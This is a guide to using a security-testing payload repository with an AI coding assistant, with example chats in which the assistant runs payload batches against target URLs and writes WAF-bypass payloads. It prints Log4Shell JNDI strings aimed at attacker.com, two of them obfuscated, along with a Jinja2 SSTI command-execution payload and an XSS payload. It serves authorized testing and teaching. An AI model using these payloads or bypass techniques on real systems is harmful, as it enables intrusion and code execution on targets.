# 🤖 Using SecurityForge with Claude Code - Step-by-Step Guide

## What is Claude Code?

Claude Code (Windsurf IDE) is an AI-powered development environment that integrates Claude AI directly into your coding workflow. This guide shows you how to use SecurityForge payloads with Claude Code for security testing.

---

## 📋 Prerequisites

- Windsurf IDE installed ([Download here](https://codeium.com/windsurf))
- SecurityForge repository cloned
- Basic understanding of security testing concepts

---

## 🚀 Step-by-Step Usage Guide

### Step 1: Open SecurityForge in Windsurf

```bash
# Clone the repository
git clone https://github.com/dalisecurity/securityforge.git
cd securityforge

# Open in Windsurf
windsurf .
```

Or use the GUI:
1. Open Windsurf IDE
2. Click **File → Open Folder**
3. Navigate to `securityforge` directory
4. Click **Open**

---

### Step 2: Activate Claude in Windsurf

1. Click the **Cascade** button (bottom left)
2. Or press `Cmd+L` (Mac) / `Ctrl+L` (Windows/Linux)
3. The Claude chat panel will appear on the right

---

### Step 3: Ask Claude to Help with Payloads

#### Example 1: Find XSS Payloads

**You ask:**
```
Show me XSS payloads for testing against Cloudflare WAF
```

**Claude will:**
1. Read `payloads/xss/xss_basic.txt`
2. Read `payloads/xss/xss_advanced.txt`
3. Show you relevant payloads
4. Explain which ones are most effective

#### Example 2: Test Specific CVE

**You ask:**
```
How do I test CVE-2021-44228 (Log4Shell) using this repository?
```

**Claude will:**
1. Find the Log4Shell payload in the CVE database
2. Show you the payload
3. Explain how to use `waf_tester.py`
4. Provide step-by-step testing instructions

#### Example 3: Generate Custom Payloads

**You ask:**
```
Create a custom XSS payload that bypasses filters using Unicode encoding
```

**Claude will:**
1. Analyze existing payloads in `payloads/xss/`
2. Generate a new Unicode-encoded XSS payload
3. Explain the bypass technique
4. Suggest how to test it

---

### Step 4: Run Security Tests with Claude's Help

#### Interactive Testing

**You ask:**
```
Run the interactive WAF tester for me
```

**Claude will:**
1. Open a terminal in Windsurf
2. Run `python3 waf_tester.py -i`
3. Guide you through the interactive menu
4. Help interpret results

#### Automated Testing

**You ask:**
```
Test all XSS payloads against https://example.com
```

**Claude will:**
1. Create a test script
2. Run: `python3 waf_tester.py -t https://example.com -p payloads/xss/`
3. Analyze the results
4. Generate a summary report

---

### Step 5: Analyze Results with Claude

**You ask:**
```
Analyze the test results and tell me which payloads were blocked
```

**Claude will:**
1. Read the JSON results file
2. Parse the data
3. Show you statistics:
   - Total payloads tested
   - Blocked vs bypassed
   - WAF vendor detected
   - Confidence scores
4. Provide recommendations

---

## 💡 Advanced Use Cases

### Use Case 1: Web Shell Detection

**You ask:**
```
Show me all PHP web shells and explain how to detect them
```

**Claude will:**
1. List all shells from `payloads/web_shells/php_shells.txt`
2. Explain detection signatures
3. Show you how to create detection rules
4. Suggest YARA rules or regex patterns

### Use Case 2: LLM Security Testing

**You ask:**
```
Test my AI chatbot for prompt injection vulnerabilities
```

**Claude will:**
1. Show you prompts from `payloads/llm_testing/adversarial_prompts.txt`
2. Explain jailbreak techniques
3. Guide you through testing your AI
4. Help you implement safeguards

### Use Case 3: Mobile App Security

**You ask:**
```
What mobile security payloads do we have for Android apps?
```

**Claude will:**
1. Show mobile-specific payloads
2. Explain OWASP Mobile Top 10 coverage
3. Guide you through mobile security testing
4. Suggest tools and techniques

### Use Case 4: Custom Payload Generation

**You ask:**
```
Generate 10 new SSTI payloads for Jinja2 template engine
```

**Claude will:**
1. Analyze existing SSTI payloads
2. Generate new variations
3. Explain the injection techniques
4. Save them to a new file

---

## 🎯 Practical Workflows

### Workflow 1: Bug Bounty Testing

```
1. You: "I'm testing example.com for a bug bounty. What should I start with?"
2. Claude: Shows you reconnaissance steps and initial payloads
3. You: "Test for XSS vulnerabilities"
4. Claude: Runs XSS tests and shows results
5. You: "The WAF blocked everything. How do I bypass it?"
6. Claude: Suggests advanced bypass techniques
7. You: "Generate a report for my findings"
8. Claude: Creates a professional HTML report
```

### Workflow 2: Learning Security Testing

```
1. You: "I'm new to security testing. Teach me about SQL injection"
2. Claude: Explains SQLi concepts with examples from payloads/sqli/
3. You: "Show me a safe way to practice"
4. Claude: Sets up a local test environment
5. You: "Let me try a basic SQLi payload"
6. Claude: Guides you through testing step-by-step
7. You: "What defenses prevent this?"
8. Claude: Explains parameterized queries and WAFs
```

### Workflow 3: WAF Configuration Testing

```
1. You: "I need to test our new WAF configuration"
2. Claude: Suggests a comprehensive test plan
3. You: "Run all payload categories against our WAF"
4. Claude: Executes batch testing
5. You: "Which payloads got through?"
6. Claude: Analyzes results and shows bypasses
7. You: "Help me tune the WAF rules"
8. Claude: Provides specific rule recommendations
```

---

## 🔧 Tips for Best Results

### 1. Be Specific
❌ **Bad:** "Show me payloads"
✅ **Good:** "Show me XSS payloads that bypass Cloudflare WAF using Unicode encoding"

### 2. Provide Context
❌ **Bad:** "Test this"
✅ **Good:** "Test https://example.com for SQL injection using time-based blind SQLi payloads"

### 3. Ask for Explanations
✅ "Explain how this XXE payload works"
✅ "Why did this payload bypass the WAF?"
✅ "What's the difference between these two SSTI payloads?"

### 4. Request Step-by-Step Guidance
✅ "Walk me through testing for SSRF vulnerabilities"
✅ "Show me how to use the payload generator step by step"
✅ "Guide me through creating a security report"

### 5. Leverage Claude's Analysis
✅ "Analyze these test results and find patterns"
✅ "Compare the effectiveness of these payload categories"
✅ "Suggest improvements to my testing methodology"

---

## 📊 Example Conversations

### Example 1: Quick Payload Lookup

**You:**
```
What's the best Log4Shell payload for testing?
```

**Claude:**
```
Here's the most effective Log4Shell (CVE-2021-44228) payload:

${jndi:ldap://attacker.com/a}

For WAF bypass, try these variants:
1. ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
2. ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap://attacker.com/a}

To test:
python3 waf_tester.py --cve CVE-2021-44228

[Claude shows the full payload and explains the bypass technique]
```

### Example 2: Automated Testing

**You:**
```
Test all payloads against my staging environment at https://staging.example.com
```

**Claude:**
```
I'll run a comprehensive test. This will take a few minutes.

Running:
1. XSS payloads (100+)
2. SQL injection (456 payloads)
3. Command injection (234 payloads)
4. SSRF (167 payloads)
...

[Claude executes the tests and shows progress]

Results:
- Total payloads tested: 2,775
- Blocked: 2,774 (99.96%)
- Bypassed: 1 (0.04%)
- WAF detected: Cloudflare

⚠️ Found 1 bypass:
Payload: <svg/onload=alert`XSS`>
Category: XSS
Confidence: High

[Claude provides detailed analysis and recommendations]
```

### Example 3: Learning and Exploration

**You:**
```
I want to learn about template injection. Start from basics.
```

**Claude:**
```
Let me teach you Server-Side Template Injection (SSTI)!

## What is SSTI?
Template injection occurs when user input is embedded into template engines
without proper sanitization...

[Claude provides a comprehensive tutorial with examples from the repository]

Let's practice with Jinja2 (Python/Flask):

Basic test: {{7*7}}
If this returns 49, the app is vulnerable.

Advanced exploitation:
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

Want to try this on a safe test environment? I can help you set one up!
```

---

## 🎓 Learning Paths

### Path 1: Beginner Security Tester

1. **Week 1:** Learn XSS
   - Ask Claude: "Teach me XSS from basics"
   - Practice with `payloads/xss/xss_basic.txt`
   - Test on safe environments

2. **Week 2:** Learn SQL Injection
   - Ask Claude: "Explain SQL injection with examples"
   - Practice with `payloads/sqli/`
   - Understand different SQLi types

3. **Week 3:** Learn Command Injection
   - Ask Claude: "Show me command injection techniques"
   - Practice with `payloads/command-injection/`
   - Learn about OS command execution

4. **Week 4:** Comprehensive Testing
   - Ask Claude: "Help me test a complete web application"
   - Use all payload categories
   - Generate professional reports

### Path 2: Bug Bounty Hunter

1. **Reconnaissance**
   - Ask Claude: "What's the best approach for bug bounty recon?"
   - Learn about scope and authorization

2. **Vulnerability Testing**
   - Ask Claude: "Test this target for all OWASP Top 10 vulnerabilities"
   - Use CVE payloads for known vulnerabilities

3. **WAF Bypass**
   - Ask Claude: "This WAF is blocking me. Suggest bypass techniques"
   - Use advanced encoding and obfuscation

4. **Reporting**
   - Ask Claude: "Generate a professional bug bounty report"
   - Include POC, impact, and remediation

### Path 3: Security Researcher

1. **Payload Analysis**
   - Ask Claude: "Analyze all XSS payloads and categorize by technique"
   - Understand bypass methodologies

2. **Custom Payload Development**
   - Ask Claude: "Help me create new WAF bypass payloads"
   - Test and validate effectiveness

3. **Tool Development**
   - Ask Claude: "Help me build a custom security scanner"
   - Integrate SecurityForge payloads

4. **Research Publication**
   - Ask Claude: "Help me document my findings"
   - Create research papers and presentations

---

## 🔒 Security Best Practices

### 1. Always Get Authorization
```
You: "Can I test this website?"
Claude: "⚠️ STOP! Do you have written authorization to test this target?
Only test:
- Your own systems
- Systems with explicit permission
- Bug bounty programs (within scope)
- CTF challenges"
```

### 2. Use Safe Environments
```
You: "Set up a safe testing environment"
Claude: "I'll help you create a local Docker environment for safe testing..."
```

### 3. Follow Responsible Disclosure
```
You: "I found a vulnerability. What should I do?"
Claude: "Follow responsible disclosure:
1. Document the vulnerability
2. Contact the vendor privately
3. Give them 90 days to fix
4. Don't publish until fixed
5. Follow bug bounty program rules"
```

---

## 🆘 Troubleshooting

### Issue 1: Claude Can't Find Files

**Problem:** "I can't find the XSS payloads"

**Solution:**
1. Make sure you're in the SecurityForge directory
2. Ask Claude: "List all files in payloads/xss/"
3. Claude will show you the directory structure

### Issue 2: Tests Not Running

**Problem:** "The WAF tester won't run"

**Solution:**
1. Ask Claude: "Check if Python 3 is installed"
2. Ask Claude: "Install the requirements"
3. Claude will diagnose and fix the issue

### Issue 3: Understanding Results

**Problem:** "I don't understand the test results"

**Solution:**
Ask Claude: "Explain these test results in simple terms"
Claude will break down the results and explain what they mean

---

## 📚 Additional Resources

- [SecurityForge README](README.md)
- [Payload Database Coverage](PAYLOAD_DATABASE_COVERAGE.md)
- [POC Simulation Guide](POC_SIMULATION_GUIDE.md)
- [AI Security Guide](AI_SECURITY_GUIDE.md)

---

## 💬 Example Prompts to Try

```
"Show me the top 10 most effective XSS payloads"
"Test CVE-2024-3400 against my target"
"Generate a custom SQLi payload for MySQL"
"Explain how SSTI works in Jinja2"
"Create a security testing checklist for web apps"
"Help me bypass this WAF"
"Generate a professional security report"
"Teach me about SSRF vulnerabilities"
"What mobile security tests should I run?"
"Show me LLM jailbreak techniques"
```

---

**Happy Testing with Claude Code! 🚀**

Remember: Always test ethically and with proper authorization!
